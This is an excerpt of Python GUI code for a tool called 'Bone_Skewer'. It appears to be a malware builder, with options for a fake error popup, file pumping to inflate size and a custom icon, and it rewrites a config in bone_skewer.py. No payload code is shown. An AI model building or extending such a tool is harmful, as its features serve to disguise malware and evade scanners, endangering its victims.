...
class App(customtkinter.CTk):
    def __init__(self):
        ...
        self.iconbitmap(r"./gui_images/Bone_Skewer.ico")
        ...
        self.logo_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "Bone_Skewer.png")), size=(60, 60))
        self.large_test_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "Bone_Skewer.png")), size=(500, 150))
        self.image_icon_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "Bone_Skewer.png")), size=(20, 20))
        ...
        self.error = customtkinter.CTkCheckBox(self.builder_frame, text="Fake Error", font=customtkinter.CTkFont(
            size=17, family=self.font), fg_color="#2b565e", hover_color="#366b76")
        ...
        self.pump = customtkinter.CTkCheckBox(self.builder_frame, text="File Pumper", font=customtkinter.CTkFont(size=17, family=self.font),
                                              fg_color="#2b565e", hover_color="#366b76", command=self.check_pumper)
        ...
        self.pump_size = customtkinter.CTkOptionMenu(self.builder_frame, width=30, font=customtkinter.CTkFont(
            size=17, family=self.font), values=["5mb", "10mb", "15mb", "20mb", "25mb", "30mb"], fg_color="#2b565e", button_hover_color="#366b76", button_color="#27464b")
        ...
        self.icon = customtkinter.CTkButton(self.builder_frame, width=250, text="Add Icon", fg_color="#2b565e", hover_color="#366b76",
    ...
    def reset_icon_button(self):
        self.icon.configure(self.builder_frame, width=250, text="Add Icon", fg_color="#2b565e", hover_color="#366b76",
                            font=customtkinter.CTkFont(size=33, family=self.font), command=self.get_icon)
    ...
    def get_config(self):
        with open(self.basefilepath + "\\bone_skewer.py", 'r', encoding="utf-8") as f:
            code = f.read()
        ...
        if config_match:
            ...
            raise Exception("Could not find config in bone_skewer.py")
